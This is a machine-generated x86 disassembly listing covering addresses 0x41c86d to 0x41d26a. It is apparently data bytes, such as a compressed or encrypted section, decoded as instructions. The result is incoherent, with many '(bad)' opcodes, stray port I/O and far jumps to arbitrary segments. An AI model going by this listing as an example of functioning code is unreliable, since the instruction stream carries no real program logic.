  41c86d:	sub    ebx,0xffffffd0
  41c870:	pop    eax
  41c871:	and    DWORD PTR [ecx+edx*1-0x69],ebp
  41c875:	fstp   QWORD PTR [edi+0x6c]
  41c878:	rol    WORD PTR gs:[ebp-0x4f2c440],1
  41c880:	fwait
  41c881:	loope  0x41c8e0
  41c883:	idiv   DWORD PTR [edi]
  41c885:	cmp    BYTE PTR [ebp+0x55],bl
  41c888:	in     eax,0x3d
  41c88a:	cld    
  41c88b:	adc    eax,0xc2288ff8
  41c890:	lds    eax,FWORD PTR [ebx+0x3d92939e]
  41c896:	or     eax,0xdccd033c
  41c89b:	dec    edx
  41c89c:	retf   
  41c89d:	push   eax
  41c89e:	test   al,0x71
  41c8a0:	hlt    
  41c8a1:	push   ebx
  41c8a2:	and    ch,BYTE PTR [ecx-0x7ef49e48]
  41c8a8:	or     al,0xe0
  41c8aa:	and    BYTE PTR ds:0x799b47ae,cl
  41c8b0:	and    edi,0x23f36a68
  41c8b6:	outs   dx,BYTE PTR ss:[esi]
  41c8b8:	push   edx
  41c8b9:	inc    ecx
  41c8ba:	pop    ecx
  41c8bb:	push   cs
  41c8bc:	cwde   
  41c8bd:	pop    ds
  41c8be:	and    eax,0x1a5ae161
  41c8c3:	(bad)  
  41c8c4:	pop    esi
  41c8c5:	fldcw  WORD PTR [ecx]
  41c8c7:	mov    bh,0x40
  41c8c9:	inc    esp
  41c8ca:	shl    BYTE PTR ds:0xfbd5303e,0x41
  41c8d1:	xchg   dx,ax
  41c8d3:	pop    esp
  41c8d4:	mov    ds:0xc2656a62,al
  41c8d9:	mov    ds:0x6f9274e1,eax
  41c8de:	arpl   WORD PTR [edx],sp
  41c8e0:	pop    ebp
  41c8e1:	dec    esi
  41c8e2:	repnz sbb cl,ah
  41c8e5:	das    
  41c8e6:	and    ecx,DWORD PTR [esi+0x316f7a6b]
  41c8ec:	cmp    dl,BYTE PTR [ecx+0x0]
	...
  41c953:	add    BYTE PTR [eax],al
  41c955:	add    BYTE PTR [ebx+0x34],ah
  41c958:	lods   eax,DWORD PTR ds:[esi]
  41c959:	xor    al,0xff
  41c95b:	mov    ebp,0x291877fb
  41c960:	cmp    eax,DWORD PTR [ecx]
  41c962:	inc    ebx
  41c963:	sbb    eax,0x3367acae
  41c968:	add    DWORD PTR [eax],eax
  41c96a:	add    BYTE PTR [ecx],al
  41c96c:	add    BYTE PTR [eax],al
  41c96e:	inc    edi
  41c96f:	ss pushf 
  41c971:	cmp    al,0xd8
  41c973:	mov    al,ds:0xcc501f8c
  41c978:	into   
  41c979:	test   BYTE PTR [esi-0xda32f04],bl
  41c97f:	adc    al,0x8a
  41c981:	dec    eax
  41c982:	inc    ebp
  41c983:	out    0x4,eax
  41c985:	fs pop ebp
  41c987:	das    
  41c988:	mov    eax,ds:0x6c907478
  41c98d:	pop    ebx
  41c98e:	xor    eax,0x116c8f62
  41c993:	je     0x41c9bd
  41c995:	into   
  41c996:	sbb    eax,0xceeee6cc
  41c99b:	sub    eax,edx
  41c99d:	test   BYTE PTR [ebx],ah
  41c99f:	repz out dx,al
  41c9a1:	push   ebx
  41c9a2:	test   ecx,edx
  41c9a4:	lahf   
  41c9a5:	inc    edx
  41c9a6:	pop    edx
  41c9a7:	mov    ecx,DWORD PTR [ebx-0x665fc1d]
  41c9ad:	mov    fs,ecx
  41c9af:	cdq    
  41c9b0:	jecxz  0x41ca07
  41c9b2:	cmc    
  41c9b3:	out    0xd5,eax
  41c9b5:	sahf   
  41c9b6:	add    DWORD PTR [edi+0x77],0x1d
  41c9ba:	not    ebx
  41c9bc:	or     BYTE PTR [edi],ch
  41c9be:	mov    esi,0x14d422b9
  41c9c3:	fisub  DWORD PTR [ebx+0x7e]
  41c9c6:	or     edx,DWORD PTR [ebx]
  41c9c8:	out    0xfe,eax
  41c9ca:	test   edx,ecx
  41c9cc:	lods   al,BYTE PTR ds:[esi]
  41c9cd:	pusha  
  41c9ce:	jg     0x41c960
  41c9d0:	xchg   esp,eax
  41c9d1:	lock loope 0x41c9f0
  41c9d4:	js     0x41ca18
  41c9d6:	(bad)  
  41c9d7:	cmp    BYTE PTR [edi-0x12],al
  41c9da:	leave  
  41c9db:	or     al,0x1b
  41c9dd:	mov    esi,0x4bf3099e
  41c9e2:	pop    esp
  41c9e3:	and    dh,BYTE PTR ss:[ebp-0x7d14b1e9]
  41c9ea:	sar    BYTE PTR [ebx],1
  41c9ec:	sub    ebp,esp
  41c9ee:	dec    esp
  41c9ef:	and    eax,0xe72896e0
  41c9f4:	ret    0xda5d
  41c9f7:	mov    ebp,0xcff373a9
  41c9fc:	sub    BYTE PTR [ecx],0xc
  41c9ff:	pcmpeqd mm2,QWORD PTR [edi-0x29046616]
  41ca06:	add    dh,cl
  41ca08:	inc    edx
  41ca09:	mov    esp,0x2c4de7a
  41ca0e:	(bad)  
  41ca0f:	push   0xfffffffa
  41ca11:	rcr    BYTE PTR ds:0xb6d3db4b,cl
  41ca17:	jae    0x41ca64
  41ca19:	ret    0x9b6e
  41ca1c:	add    BYTE PTR [ebp+edi*4+0x2671637c],cl
  41ca23:	aad    0x6f
  41ca25:	dec    esp
  41ca26:	fldcw  WORD PTR [esi-0x2c]
  41ca29:	sub    al,0xfa
  41ca2b:	jb     0x41c9fb
  41ca2d:	sub    eax,0xb72cc42e
  41ca32:	aaa    
  41ca33:	fs mov cl,0xd2
  41ca36:	pop    es
  41ca37:	leave  
  41ca38:	sbb    bl,BYTE PTR [ecx-0x7e]
  41ca3b:	cli    
  41ca3c:	pop    edx
  41ca3d:	cs out 0xba,al
  41ca40:	and    eax,DWORD PTR [ebx-0x6f]
  41ca43:	and    BYTE PTR [edi],ch
  41ca45:	mov    ds:0xb7e7da23,al
  41ca4a:	add    al,BYTE PTR [edx+0x57]
  41ca4d:	cmc    
  41ca4e:	daa    
  41ca4f:	lock mov eax,0x69e122d4
  41ca55:	(bad)  
  41ca57:	das    
  41ca58:	jecxz  0x41cad2
  41ca5a:	lock jmp 0x41ca90
  41ca5d:	sbb    ecx,DWORD PTR [eax]
  41ca5f:	add    al,0x7a
  41ca61:	fisubr DWORD PTR [ebx+0x2d3a5d8d]
  41ca67:	jg     0x41ca5a
  41ca69:	dec    eax
  41ca6a:	sbb    edx,DWORD PTR [esi]
  41ca6c:	lock and eax,DWORD PTR [eax]
	...
  41cad3:	add    BYTE PTR [eax],al
  41cad5:	add    al,dh
  41cad7:	retf   0xfc94
  41cada:	mov    esi,0xc1cef8fe
  41cadf:	or     al,BYTE PTR [ebx+0x0]
  41cae2:	aam    0x31
  41cae4:	jnp    0x41caa8
  41cae6:	addr16 xor al,0x1
  41cae9:	add    BYTE PTR [eax],al
  41caeb:	add    DWORD PTR [eax],eax
  41caed:	add    BYTE PTR [edx],bh
  41caef:	retf   
  41caf0:	push   edi
  41caf1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41caf2:	ret    
  41caf3:	mov    edx,0x1145be2b
  41caf8:	jp     0x41cab8
  41cafa:	xchg   edx,eax
  41cafb:	push   ecx
  41cafc:	adc    eax,0x8a9538a7
  41cb01:	mov    esp,0x7bdcfd38
  41cb06:	mov    ch,0x78
  41cb08:	fdiv   DWORD PTR [edx]
  41cb0a:	cmp    BYTE PTR [ebx+0x1e],0x5
  41cb0e:	out    dx,al
  41cb0f:	xor    si,WORD PTR [ecx-0x5937bf33]
  41cb16:	jns    0x41cb83
  41cb18:	or     ecx,ebx
  41cb1a:	retf   0xb67
  41cb1d:	mov    esi,0x7352df9e
  41cb22:	or     ebx,DWORD PTR [ecx+0x5a]
  41cb25:	dec    edi
  41cb26:	mov    ah,0xce
  41cb28:	jl     0x41caf0
  41cb2a:	dec    esp
  41cb2b:	push   0xfa00d433
  41cb30:	ins    DWORD PTR es:[edi],dx
  41cb31:	push   0x67
  41cb33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cb34:	push   0xffffffed
  41cb36:	rol    DWORD PTR [ebx+0x27606b6a],cl
  41cb3c:	stos   BYTE PTR es:[edi],al
  41cb3d:	cli    
  41cb3e:	dec    edi
  41cb3f:	and    edi,0x52b75b6f
  41cb45:	lods   al,BYTE PTR ds:[esi]
  41cb46:	sub    esi,esp
  41cb48:	gs or  al,0xbd
  41cb4b:	push   ebp
  41cb4c:	and    al,0x55
  41cb4e:	cmp    DWORD PTR [ebx+0x53568270],edi
  41cb54:	call   0x4c41:0x8a4b14ea
  41cb5b:	sbb    bl,bh
  41cb5d:	add    esp,edx
  41cb5f:	mov    BYTE PTR [ecx+0x5c26458a],dl
  41cb65:	push   0xff467ea5
  41cb6a:	mov    BYTE PTR [ebx],dh
  41cb6c:	loope  0x41cbaf
  41cb6e:	dec    edx
  41cb6f:	out    0x44,eax
  41cb71:	rol    DWORD PTR ds:0x234c7a29,1
  41cb77:	scas   eax,DWORD PTR es:[edi]
  41cb78:	lds    edi,FWORD PTR [eax-0x6aff1b63]
  41cb7e:	xchg   edx,eax
  41cb7f:	push   eax
  41cb80:	sahf   
  41cb81:	xor    eax,edx
  41cb83:	sahf   
  41cb84:	fild   WORD PTR [ecx+0x2b7944f3]
  41cb8a:	in     al,dx
  41cb8b:	imul   edx,DWORD PTR [edx+esi*4],0x493947aa
  41cb92:	arpl   di,ax
  41cb94:	mov    bh,0x4e
  41cb96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb97:	jecxz  0x41cbca
  41cb99:	loop   0x41cb39
  41cb9b:	sbb    eax,0x8412cb82
  41cba0:	call   FWORD PTR [ecx+0x61]
  41cba3:	push   cs
  41cba4:	shl    DWORD PTR [esi+0x2a],1
  41cba7:	icebp  
  41cba8:	sar    DWORD PTR [ebp+0x45],1
  41cbab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cbac:	arpl   WORD PTR [ecx+0x3a],cx
  41cbaf:	fisubr WORD PTR [ebx+0x5d]
  41cbb2:	jmp    0x736a:0x2f13f6ae
  41cbb9:	(bad)  
  41cbba:	sub    bl,BYTE PTR [edi+0x39]
  41cbbd:	mov    bh,0xff
  41cbbf:	mov    al,0x13
  41cbc1:	xchg   esp,eax
  41cbc2:	sub    eax,0xd5bf8ef4
  41cbc7:	jne    0x41cbc2
  41cbc9:	pop    ebp
  41cbca:	outs   dx,BYTE PTR ds:[esi]
  41cbcb:	repnz pop es
  41cbcd:	xor    al,0xb5
  41cbcf:	and    al,0x9c
  41cbd1:	ret    
  41cbd2:	cmp    eax,0xfee6b3b7
  41cbd7:	push   esi
  41cbd8:	sub    BYTE PTR [eax-0x12],dh
  41cbdb:	std    
  41cbdc:	stos   DWORD PTR es:[edi],eax
  41cbdd:	test   BYTE PTR [esi+0x197e0147],ch
  41cbe3:	or     DWORD PTR [esi+0x27103f40],ebp
  41cbe9:	scas   eax,DWORD PTR es:[edi]
  41cbea:	inc    eax
  41cbeb:	mov    cl,0xba
  41cbed:	adc    al,BYTE PTR [eax]
	...
  41cc53:	add    BYTE PTR [eax],al
  41cc55:	add    BYTE PTR [ecx],ch
  41cc57:	(bad)  
  41cc58:	sti    
  41cc59:	pop    ebp
  41cc5a:	(bad)  
  41cc5b:	jge    0x41cc0c
  41cc5d:	neg    cl
  41cc5f:	hlt    
  41cc60:	add    eax,0x60176f22
  41cc65:	mov    ah,BYTE PTR [edi+0x35]
  41cc68:	add    DWORD PTR [eax],eax
  41cc6a:	add    BYTE PTR [ecx],al
  41cc6c:	add    BYTE PTR [eax],al
  41cc6e:	lock cdq 
  41cc70:	add    DWORD PTR [ebx+0x54c47648],ebp
  41cc76:	inc    esp
  41cc77:	mov    WORD PTR [edx+esi*1+0x64e6d82c],?
  41cc7e:	or     ah,dh
  41cc80:	mov    ecx,0x41208fc3
  41cc85:	sbb    BYTE PTR [edi-0x40],dl
  41cc88:	clc    
  41cc89:	pop    ecx
  41cc8a:	pop    es
  41cc8b:	or     al,0xa4
  41cc8d:	add    ecx,DWORD PTR [esi]
  41cc8f:	cld    
  41cc90:	or     ch,BYTE PTR [ecx]
  41cc92:	sub    eax,0x7427e2b1
  41cc97:	pop    edx
  41cc98:	and    al,0xb4
  41cc9a:	aam    0xe1
  41cc9c:	mov    eax,ds:0x609279bc
  41cca1:	sub    esi,DWORD PTR [edx-0x44fd1574]
  41cca7:	mov    ecx,0x32c49ea7
  41ccac:	scas   eax,DWORD PTR es:[edi]
  41ccad:	retf   
  41ccae:	inc    esi
  41ccaf:	push   ds
  41ccb0:	mov    al,0x2e
  41ccb2:	(bad)  
  41ccb3:	and    DWORD PTR [edi+ecx*8-0x6e],ebp
  41ccb7:	enter  0xafd2,0x18
  41ccbb:	mov    ebp,0x7a126159
  41ccc0:	mov    ah,cl
  41ccc2:	mov    bl,0x53
  41ccc4:	jp     0x41cc46
  41ccc6:	sbb    eax,0xebb947bb
  41cccb:	add    eax,DWORD PTR [eax+0x8]
  41ccce:	pop    edi
  41cccf:	xor    eax,0xe761439b
  41ccd4:	call   0x9805:0xedfd1e66
  41ccdb:	out    dx,eax
  41ccdc:	out    dx,eax
  41ccdd:	push   edi
  41ccde:	cmp    dh,BYTE PTR [edx-0x217da2ae]
  41cce4:	xchg   ebp,eax
  41cce5:	jle    0x41cc8d
  41cce7:	(bad)  
  41cce9:	adc    dl,ah
  41cceb:	mov    ecx,0x227c2d34
  41ccf0:	xor    ch,dl
  41ccf2:	mov    BYTE PTR [esi],dl
  41ccf4:	(bad)  
  41ccf5:	daa    
  41ccf6:	and    DWORD PTR ds:0x371777ab,esp
  41ccfc:	sbb    al,0x7f
  41ccfe:	xchg   edx,eax
  41ccff:	fsubr  QWORD PTR [edi+ebp*1-0x546a367a]
  41cd06:	sub    DWORD PTR [ebx],esp
  41cd08:	xchg   ebp,eax
  41cd09:	xor    al,0x9f
  41cd0b:	lahf   
  41cd0c:	pop    eax
  41cd0d:	imul   ebp,ebx,0xffffffc0
  41cd10:	mov    al,BYTE PTR [ebx-0x53cd70]
  41cd16:	adc    BYTE PTR [edx+0x1b8eb8e3],cl
  41cd1c:	adc    ch,BYTE PTR [esp+ebp*2]
  41cd1f:	pop    ebp
  41cd20:	sub    al,0xa0
  41cd22:	inc    esi
  41cd23:	push   ds
  41cd24:	(bad)  [edx+ebp*8]
  41cd27:	stos   DWORD PTR es:[edi],eax
  41cd28:	dec    edx
  41cd29:	lods   eax,DWORD PTR ds:[esi]
  41cd2a:	dec    edi
  41cd2b:	push   ds
  41cd2c:	pop    edi
  41cd2d:	popa   
  41cd2e:	dec    edx
  41cd2f:	add    eax,0xba7f036e
  41cd34:	dec    esp
  41cd35:	inc    eax
  41cd36:	mov    ebp,0xcee9d565
  41cd3b:	xor    eax,0x9e670ce4
  41cd40:	or     ecx,edx
  41cd42:	mov    ds:0x52090af3,eax
  41cd47:	add    BYTE PTR [ebx+0x77],0x36
  41cd4b:	hlt    
  41cd4c:	mov    ebx,0xc53abda7
  41cd51:	sub    BYTE PTR [esp+ebp*4],0x1b
  41cd55:	int3   
  41cd56:	bndldx (bad),[edi+0x23a760c]
  41cd5d:	sti    
  41cd5e:	lods   eax,DWORD PTR ds:[esi]
  41cd5f:	sti    
  41cd60:	into   
  41cd61:	push   es
  41cd62:	ins    DWORD PTR es:[edi],dx
  41cd63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd65:	icebp  
  41cd66:	sub    eax,0x6e4dda80
  41cd6b:	loop   0x41cd94
  41cd6d:	inc    esp
	...
  41cdd6:	pusha  
  41cdd7:	cdq    
  41cdd8:	fsubr  st(5),st
  41cdda:	std    
  41cddb:	in     eax,0x79
  41cddd:	popf   
  41cdde:	in     al,dx
  41cddf:	stc    
  41cde0:	jmp    0x41ce12
  41cde2:	sahf   
  41cde3:	inc    ebp
  41cde4:	dec    edx
  41cde5:	fbld   TBYTE PTR [edi+0x36]
  41cde8:	add    DWORD PTR [eax],eax
  41cdea:	add    BYTE PTR [ecx],al
  41cdec:	add    BYTE PTR [eax],al
  41cdee:	cld    
  41cdef:	dec    edx
  41cdf0:	jb     0x41ce54
  41cdf2:	jecxz  0x41cdfe
  41cdf4:	fs mov edx,?
  41cdf7:	test   al,0xbf
  41cdf9:	mov    ah,0x2
  41cdfb:	xchg   edx,eax
  41cdfc:	stos   BYTE PTR es:[edi],al
  41cdfd:	fxch   st(4)
  41cdff:	sbb    edi,DWORD PTR [edi+0x55c21583]
  41ce05:	out    dx,eax
  41ce06:	and    eax,0x56f288b7
  41ce0b:	lock sub BYTE PTR [edx],dh
  41ce0e:	sub    cl,BYTE PTR [eax+0x16]
  41ce11:	inc    esi
  41ce12:	add    edx,DWORD PTR [eax-0x688c4b]
  41ce18:	push   ds
  41ce19:	(bad)  
  41ce1b:	add    ebp,ebp
  41ce1d:	xchg   ebp,eax
  41ce1e:	ds rcr ecx,cl
  41ce21:	xchg   ebx,eax
  41ce22:	pusha  
  41ce23:	jp     0x41cdfb
  41ce25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce26:	scas   eax,DWORD PTR es:[edi]
  41ce27:	xlat   BYTE PTR ds:[ebx]
  41ce28:	shl    dl,1
  41ce2a:	pushf  
  41ce2b:	pop    ebx
  41ce2c:	dec    ebp
  41ce2d:	js     0x41ce43
  41ce2f:	scas   al,BYTE PTR es:[edi]
  41ce30:	push   0xeda7749
  41ce35:	xchg   DWORD PTR [edi+0x38],esi
  41ce38:	pop    ds
  41ce39:	mov    edi,0x3956a85e
  41ce3e:	mov    cs,WORD PTR [eax+ebp*1+0x3206adce]
  41ce45:	and    DWORD PTR [ebp+0x5d],0xffffffa6
  41ce49:	outs   dx,DWORD PTR ds:[esi]
  41ce4a:	xchg   esp,eax
  41ce4b:	cmp    BYTE PTR [eax-0x33],0x96
  41ce4f:	les    esp,FWORD PTR [esi+0x8]
  41ce52:	scas   eax,DWORD PTR es:[edi]
  41ce53:	out    0x98,eax
  41ce55:	mov    esi,0x7ea0deb7
  41ce5a:	mov    DWORD PTR [ebp-0x61b96363],esi
  41ce60:	pop    ss
  41ce61:	pop    ebp
  41ce62:	sub    BYTE PTR [edx-0x68],bl
  41ce65:	jbe    0x41cdf3
  41ce67:	sub    dh,dh
  41ce69:	in     eax,0x3
  41ce6b:	addr16 jp 0x41ceeb
  41ce6e:	les    edi,FWORD PTR [edi-0x2fd9c9cf]
  41ce74:	out    0x7e,eax
  41ce76:	in     eax,0xc6
  41ce78:	out    dx,al
  41ce79:	add    DWORD PTR [edi],ecx
  41ce7b:	mov    es,WORD PTR [ebx]
  41ce7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce7e:	psubb  mm1,mm5
  41ce81:	outs   dx,DWORD PTR ds:[esi]
  41ce82:	mov    al,ds:0x60993cb7
  41ce87:	idiv   cl
  41ce89:	dec    ebx
  41ce8a:	jle    0x41cf01
  41ce8c:	xchg   edx,eax
  41ce8d:	(bad)  [ebx+ebx*8-0x4]
  41ce91:	fwait
  41ce92:	mov    al,0xc
  41ce94:	int    0x26
  41ce96:	push   ss
  41ce97:	fst    QWORD PTR [edx-0x6d831abf]
  41ce9d:	mov    bh,0x36
  41ce9f:	xchg   esi,eax
  41cea0:	adc    al,BYTE PTR ds:0x74aad701
  41cea6:	mov    ebx,0x2ea313e0
  41ceab:	enter  0xbda9,0x31
  41ceaf:	mov    ecx,DWORD PTR [eax-0x6421679d]
  41ceb5:	mov    es,WORD PTR [esp+ecx*1-0x4a]
  41ceb9:	fisttp DWORD PTR ds:0x70deb369
  41cebf:	jae    0x41cf06
  41cec1:	imul   eax,DWORD PTR [esi+ecx*4-0x5d48fc98],0x1a
  41cec9:	sbb    eax,0x3f3f39f9
  41cece:	fistp  WORD PTR [esi-0x10]
  41ced1:	jecxz  0x41cee3
  41ced3:	mov    edx,0x8ad2c5d0
  41ced8:	ret    
  41ced9:	jnp    0x41ceb8
  41cedb:	pop    eax
  41cedc:	dec    ecx
  41cedd:	(bad)  [esi-0x3f]
  41cee0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cee1:	sar    DWORD PTR [ebp+0x4626d1ce],cl
  41cee7:	xchg   ch,cl
  41cee9:	inc    edi
  41ceea:	gs loope 0x41cf1b
  41ceed:	mov    ds:0x0,eax
	...
  41cf56:	pop    es
  41cf57:	jp     0x41cf41
  41cf59:	jnp    0x41cf58
  41cf5b:	sti    
  41cf5c:	xchg   edi,eax
  41cf5d:	jle    0x41cfa6
  41cf5f:	jp     0x41cf3b
  41cf61:	lods   al,BYTE PTR ds:[esi]
  41cf62:	cmp    eax,esp
  41cf64:	push   ecx
  41cf65:	(bad)  
  41cf66:	addr16 aaa 
  41cf68:	add    DWORD PTR [eax],eax
  41cf6a:	add    BYTE PTR [ecx],al
  41cf6c:	add    BYTE PTR [eax],al
  41cf6e:	dec    esi
  41cf6f:	test   dh,cl
  41cf71:	jo     0x41cf19
  41cf73:	mov    eax,0x54cbe528
  41cf78:	inc    ecx
  41cf79:	aaa    
  41cf7a:	in     eax,dx
  41cf7b:	sub    BYTE PTR [ebx],0xe5
  41cf7e:	add    eax,0x15933701
  41cf83:	mov    dl,0xee
  41cf85:	jo     0x41cfb0
  41cf87:	out    dx,al
  41cf88:	adc    DWORD PTR [esi-0x79b588f5],0xffffffe1
  41cf8f:	loopne 0x41cfc4
  41cf91:	xor    eax,0xc37bbd48
  41cf96:	fidiv  WORD PTR ds:0xe6fa7670
  41cf9c:	out    dx,al
  41cf9d:	enter  0x226b,0x6e
  41cfa1:	(bad)  
  41cfa2:	aaa    
  41cfa3:	fnstsw WORD PTR [ebp+ebp*1+0x15a463b9]
  41cfaa:	adc    ebp,DWORD PTR [ebp+0x5f0ae6bf]
  41cfb0:	gs xchg ebp,eax
  41cfb2:	fisttp DWORD PTR [ebx]
  41cfb4:	shl    BYTE PTR [eax-0x47d499a2],1
  41cfba:	mov    cl,0x27
  41cfbc:	jbe    0x41cfe1
  41cfbe:	dec    edx
  41cfbf:	push   0x5133d10b
  41cfc4:	mov    ebx,0xe96921c5
  41cfc9:	js     0x41d021
  41cfcb:	outs   dx,DWORD PTR ds:[esi]
  41cfcc:	stos   DWORD PTR es:[edi],eax
  41cfcd:	dec    esi
  41cfce:	xchg   ebp,eax
  41cfcf:	lds    esp,FWORD PTR [ebx+0x294ce63a]
  41cfd5:	sub    ch,bl
  41cfd7:	in     eax,0x40
  41cfd9:	mov    dl,0x23
  41cfdb:	mov    ebx,0xafbc0c26
  41cfe0:	sbb    esp,DWORD PTR [ecx]
  41cfe2:	lods   al,BYTE PTR ds:[esi]
  41cfe3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cfe4:	mov    WORD PTR [edi-0x20],cs
  41cfe7:	mov    ebx,eax
  41cfe9:	shr    DWORD PTR [ecx],1
  41cfeb:	mov    ebx,0x46c06f3
  41cff0:	sbb    DWORD PTR [ebp+eax*2+0x56],edi
  41cff4:	mov    WORD PTR [ebx+0x5689d078],fs
  41cffa:	and    cl,BYTE PTR [esi]
  41cffc:	inc    edx
  41cffd:	push   eax
  41cffe:	mov    edi,0x5a17458d
  41d003:	out    0x5b,al
  41d005:	sbb    al,0xff
  41d007:	fldenv [ebp+ecx*8+0xc]
  41d00b:	iret   
  41d00c:	lea    esp,[ebx-0x2a]
  41d00f:	add    al,0x63
  41d011:	les    esi,FWORD PTR [esi-0x1a]
  41d014:	ror    edx,0xab
  41d017:	es mov dl,0xf5
  41d01a:	data16 xchg ch,ch
  41d01d:	sub    ebp,ecx
  41d01f:	cmc    
  41d020:	pop    esi
  41d021:	in     eax,dx
  41d022:	inc    ecx
  41d023:	xor    edi,DWORD PTR [esi+0x7b]
  41d026:	or     DWORD PTR [eax+edi*1+0x72604107],0x71
  41d02e:	pop    esi
  41d02f:	ja     0x41cfee
  41d031:	xlat   BYTE PTR ds:[ebx]
  41d032:	test   eax,0x5281a210
  41d037:	xor    eax,0x7cfa55ae
  41d03c:	add    DWORD PTR [esi+0x64da822f],ebx
  41d042:	cmp    edx,edi
  41d044:	mov    al,0x91
  41d046:	loop   0x41d0a0
  41d048:	jno    0x41d0a6
  41d04a:	jae    0x41d071
  41d04c:	scas   eax,DWORD PTR es:[edi]
  41d04d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d04e:	into   
  41d04f:	repz mov esi,0xa9f0f23b
  41d055:	jmp    0x6362:0x7712388b
  41d05c:	sbb    esi,DWORD PTR [ecx-0x40]
  41d05f:	jg     0x41d03a
  41d061:	mov    ah,0x29
  41d063:	div    BYTE PTR [edx-0x6c12277b]
  41d069:	mov    ecx,0xe1e12fcb
	...
  41d0d6:	mov    ecx,0xad432034
  41d0db:	push   edi
  41d0dc:	sti    
  41d0dd:	dec    BYTE PTR [esi-0x1b]
  41d0e0:	mov    ebp,0x820d21bd
  41d0e5:	push   0x13867
  41d0ea:	add    BYTE PTR [ecx],al
  41d0ec:	add    BYTE PTR [eax],al
  41d0ee:	inc    esi
  41d0ef:	call   0xa291:0x47d7352d
  41d0f6:	nop
  41d0f7:	outs   dx,BYTE PTR ds:[esi]
  41d0f8:	leave  
  41d0f9:	push   ds
  41d0fa:	xchg   edi,eax
  41d0fb:	je     0x41d0a5
  41d0fd:	sti    
  41d0fe:	sbb    al,BYTE PTR [ebx-0x1a50e303]
  41d104:	pop    edx
  41d105:	and    eax,0xe0b4c4a
  41d10a:	iret   
  41d10b:	xchg   ecx,eax
  41d10c:	(bad)  
  41d10e:	xchg   edi,eax
  41d10f:	cdq    
  41d110:	mov    dl,0xc
  41d112:	shr    BYTE PTR [edi],cl
  41d114:	out    dx,eax
  41d115:	inc    esi
  41d116:	rol    BYTE PTR [esp+eax*1+0x53],cl
  41d11a:	cmp    al,0x6b
  41d11c:	xor    BYTE PTR [ecx+0x54cbde4c],ah
  41d122:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d123:	fmul   st(6),st
  41d125:	cs xchg edi,eax
  41d127:	cmp    dl,BYTE PTR [ecx+0xe]
  41d12a:	fnstcw WORD PTR [eax-0x4f]
  41d12d:	aas    
  41d12e:	add    al,0xd7
  41d130:	push   esi
  41d131:	pop    edi
  41d132:	ja     0x41d100
  41d134:	fistp  QWORD PTR [edi]
  41d136:	sub    cl,BYTE PTR cs:[eax]
  41d139:	jae    0x41d19b
  41d13b:	in     al,dx
  41d13c:	mov    DWORD PTR [eax-0x54905d63],0x6bd1e5d1
  41d146:	jmp    0x6459:0x40ae61b1
  41d14d:	shr    DWORD PTR [edx],cl
  41d14f:	addr16 (bad) 
  41d151:	push   esp
  41d152:	icebp  
  41d153:	mov    ?,WORD PTR [esi+0x6167e2cb]
  41d159:	stos   DWORD PTR es:[edi],eax
  41d15a:	or     ebp,edx
  41d15c:	pop    ebx
  41d15d:	pop    edi
  41d15e:	adc    eax,0x34372390
  41d163:	hlt    
  41d164:	lods   eax,DWORD PTR ds:[esi]
  41d165:	shl    DWORD PTR [eax+0x30c07c14],1
  41d16b:	sbb    al,0xbd
  41d16d:	and    ebp,ebx
  41d16f:	dec    esi
  41d170:	mov    BYTE PTR [ecx],bl
  41d172:	iret   
  41d173:	inc    ebx
  41d174:	sar    ah,0x26
  41d177:	(bad)  
  41d178:	and    al,BYTE PTR [eax+0x3aa2be34]
  41d17e:	out    dx,al
  41d17f:	stc    
  41d180:	icebp  
  41d181:	jp     0x41d143
  41d183:	cmp    edi,ecx
  41d185:	int3   
  41d186:	cmp    ecx,DWORD PTR [eax]
  41d188:	(bad)  
  41d18b:	icebp  
  41d18c:	dec    eax
  41d18d:	int    0x7b
  41d18f:	in     al,dx
  41d190:	(bad)  
  41d191:	(bad)  
  41d192:	dec    esp
  41d193:	sbb    edi,DWORD PTR [esi-0x4f08d2eb]
  41d199:	clc    
  41d19a:	mov    al,ds:0x5019a14c
  41d19f:	and    al,0x5b
  41d1a1:	pop    esi
  41d1a2:	loopne 0x41d1f4
  41d1a4:	neg    BYTE PTR [esi+ebx*2]
  41d1a7:	daa    
  41d1a8:	call   0xe623:0x21a1edff
  41d1af:	stos   BYTE PTR es:[edi],al
  41d1b0:	daa    
  41d1b1:	sub    eax,0x8d75d9ce
  41d1b6:	xchg   edi,eax
  41d1b7:	loopne 0x41d227
  41d1b9:	xchg   edi,eax
  41d1ba:	sbb    al,0x36
  41d1bc:	pop    ebx
  41d1bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d1be:	or     edi,DWORD PTR [ebp-0x3d]
  41d1c1:	push   esp
  41d1c2:	add    edi,ecx
  41d1c4:	fidiv  WORD PTR [esi]
  41d1c6:	inc    esp
  41d1c7:	jns    0x41d19f
  41d1c9:	in     al,0xb7
  41d1cb:	jmp    0x79ac76a
  41d1d0:	dec    esi
  41d1d1:	gs or  al,0xb
  41d1d4:	cmp    BYTE PTR [ebx+0x26],0xa4
  41d1d8:	jmp    0x41d1ac
  41d1da:	hlt    
  41d1db:	gs mov cl,0x6d
  41d1de:	mov    WORD PTR [ebx+0x6ebbab62],fs
  41d1e4:	dec    ecx
  41d1e5:	push   ebx
  41d1e6:	sar    DWORD PTR [eax-0x15],1
  41d1e9:	fadd   st,st(2)
  41d1eb:	inc    esi
  41d1ec:	pop    eax
  41d1ed:	sub    BYTE PTR [eax],al
	...
  41d253:	add    BYTE PTR [eax],al
  41d255:	add    BYTE PTR [eax-0x3d],dl
  41d258:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
  41d25e:	xor    DWORD PTR [ebp-0x7],esp
  41d261:	hlt    
  41d262:	clc    
  41d263:	cmp    eax,0x3967caac
  41d268:	add    DWORD PTR [eax],eax
  41d26a:	add    BYTE PTR [ecx],al
